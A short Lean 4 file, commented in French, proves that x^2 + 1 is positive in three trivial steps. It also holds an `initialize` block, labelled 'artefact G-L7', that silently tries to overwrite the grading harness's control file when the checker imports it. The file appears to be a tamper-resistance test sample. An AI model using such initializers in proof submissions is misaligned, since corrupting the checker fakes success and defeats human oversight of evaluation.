import Mathlib

-- artefact G-L7 : un initialiseur tente d'écrire dans le fichier de contrôle du harnais (à l'import par le contrôle)
initialize do
  try
    IO.FS.writeFile "/controle/Controle.lean" "-- piégé\n"
  catch _ =>
    pure ()

theorem etape_1 (x : ℝ) : 0 ≤ x ^ 2 := sq_nonneg x

theorem etape_2 (x : ℝ) : 0 ≤ x ^ 2 + 1 := by
  have h := etape_1 x
  linarith

theorem enonce_item (x : ℝ) : 0 < x ^ 2 + 1 := by
  have h := etape_1 x
  linarith
